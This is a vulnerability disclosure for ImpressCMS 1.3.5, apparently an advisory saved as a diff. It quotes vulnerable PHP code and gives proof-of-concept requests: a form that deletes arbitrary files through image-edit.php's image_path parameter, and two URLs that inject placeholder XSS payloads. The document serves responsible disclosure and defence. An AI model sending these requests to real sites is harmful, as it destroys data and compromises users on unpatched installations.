@@ -1,0 +1,88 @@
+I have discovered two vulnerabilities in ImpressCMS. These have been
+fixed in the new 1.3.6 version, which you can get at
+https://sourceforge.net/projects/impresscms/files/ImpressCMS%20Official%20Releases/ImpressCMS%201.3%20Branch/ImpressCMS%201.3.6/.
+
+One is an arbitrary file deletion and the other is two cross site
+scripting issues.
+Note that I was unable to exploit the XSS issues due to the inbuilt
+protection module, but someone smarter / with more time might be able
+to do it.
+
+The tickets containing the information are available here
+https://www.assembla.com/spaces/dW4voyNP0r4ldbeJe5cbLr/tickets?report%5Bestimate_show%5D=true&report%5Bid%5D=0&report%5Bmilestone_id_cond%5D=1&report%5Bmilestone_id_val%5D=4129593&report%5Btitle%5D=All+Tickets+for+%27ImpressCMS+1.3.6%27&report%5Btotal_estimate_show%5D=true&report%5Btotal_invested_hours_show%5D=true&report%5Bworking_hours_show%5D=true.
+
+The full report can be seen at my repo
+https://github.com/pedrib/PoC/blob/master/impresscms-1.3.5.txt
+Thanks in advance, and thanks to the ImpressCMS team for being so responsive.
+
+Regards,
+Pedro Ribeiro
+Agile Information Security
+
+--------
+Proof of concept:
+
+
+ImpressCMS 1.3.5 vulnerabilities
+===================================
+Discovered by
+Pedro Ribeiro (pedrib@gmail.com) of Agile Information Security
+
+========================================
+Vulnerability: Deletion of arbitrary files in the system
+File(line): /impresscms/htdocs/libraries/image-editor/image-edit.php(62)
+Code snippet:
+if (! is_null ( $op ) && $op == 'cancel') {
+$image_path = isset ( $_GET ['image_path'] ) ? $_GET ['image_path'] : null;
+
+if (file_exists ( $image_path )) {
+@unlink ( $image_path );
+}
+
+Proof of concept:
+<form name="input" action="http://192.168.56.101/impresscms/htdocs/libraries/image-editor/image-edit.php?op=cancel&image_path=/path/to/any/file" method="post">
+<input type="submit" value="Submit">
+</form>
+
+
+========================================
+Vulnerability: Cross site scripting (XSS)
+File(line): /impresscms/htdocs/misc.php(110)
+Code snippet:
+<h4><?php echo _MSC_AVAVATARS;?></h4>
+<form name='avatars' action='<?php echo $_SERVER['REQUEST_URI'];?>'>
+<table width='100%'>
+
+Proof of concept:
+https://192.168.56.101/impresscms/htdocs/misc.php?action=showpopups&type=avatars&target='>PAYLOAD
+
+NOTE: wasn't able to exploit with Protector on, but someone smarter might be able to do it.
+
+
+========================================
+Vulnerability: Cross site scripting (XSS)
+File(line): /impresscms/modules/system/admin/tplsets/main.php(171)
+Code snippet:
+case 'listtpl':
+$tplset = trim($_GET['tplset']);
+if ($tplset == '') {
+redirect_header('admin.php?fct=tplsets', 1);
+}
+if ($moddir == '') {
+redirect_header('admin.php?fct=tplsets', 1);
+}
+icms_cp_header();
+$module_handler = icms::handler('icms_module');
+$module =& $module_handler->getByDirname($moddir);
+$modname = $module->getVar('name');
+echo '<div class="CPbigTitle" style="background-image: url('
+. ICMS_MODULES_URL . '/system/admin/tplsets/images/tplsets_big.png)">'
+. '<a href="admin.php?fct=tplsets">'. _MD_TPLMAIN
+.'</a>&nbsp;<span style="font-weight:bold;">&raquo;&raquo;</span>&nbsp;'
+. $tplset . '&nbsp;<span style="font-weight:bold;">&raquo;&raquo;</span>&nbsp;'
+. $modname . '<br /><br /></div><br />';
+
+Proof of concept:
+https://192.168.56.101/impresscms/htdocs/modules/system/admin.php?fct=tplsets&op=listtpl&tplset=aaaa">PAYLOAD&moddir=banners
+
+NOTE: wasn't able to exploit with Protector on, but someone smarter might be able to do it.
